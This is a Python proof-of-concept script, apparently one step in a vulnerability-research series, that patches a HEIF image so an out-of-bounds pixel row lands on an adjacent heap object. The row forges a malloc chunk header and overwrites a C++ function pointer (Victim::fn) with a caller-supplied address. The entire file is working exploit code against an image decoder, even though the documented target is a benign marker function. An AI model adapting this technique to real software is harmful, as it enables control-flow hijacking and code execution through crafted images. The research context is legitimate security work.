#!/usr/bin/env python3
"""W179: put a chosen function address in the file-derived OOB row.

The committed W178 input has two 64x65 uncompressed-coded frames whose Y row 64
is `1122334455667788` x8. Replace that row in both samples with a row whose
bytes land on the adjacent live object as measured in W171:

  row[0..23]  slack inside the padding plane (ignored)
  row[24..31] neighbour chunk header; 0x8021 keeps malloc's view valid
  row[32..39] little-endian address that overwrites Victim::fn
  row[40..63] slack inside the neighbour object

Usage: make_pointer_row.py 0xADDRESS OUTPUT.heif
The address must be the non-PIE address of benign_marker() in the driver built
from real/reencode_interpose_marker.cc.
"""
import hashlib
import struct
import sys
from pathlib import Path

SOURCE = Path(__file__).resolve().parent / "evidence" / "uncompressed" / "byte-exact.heif"
SOURCE_SHA = "b585565b5ca9af5860880c2102ae124749f298a5a3319e08a24e57cb8ca3a249"
OLD_ROW = bytes.fromhex("1122334455667788" * 8)
ROW_OFFSETS = (4776, 11048)  # mdat data start 680 + 4096 + n*6272

if len(sys.argv) != 3:
    sys.exit("usage: make_pointer_row.py 0xADDRESS OUTPUT.heif")
address = int(sys.argv[1], 0)
out = Path(sys.argv[2])
data = bytearray(SOURCE.read_bytes())
assert hashlib.sha256(data).hexdigest() == SOURCE_SHA, "source input changed"
row = bytearray([0x90] * 64)
row[24:32] = struct.pack("<Q", 0x8021)
row[32:40] = struct.pack("<Q", address)
for off in ROW_OFFSETS:
    assert bytes(data[off:off + 64]) == OLD_ROW, f"unexpected row at {off}"
    data[off:off + 64] = row
out.write_bytes(data)
print(f"address=0x{address:x} row={row.hex()} output={out}")
print(f"sha256={hashlib.sha256(data).hexdigest()}")
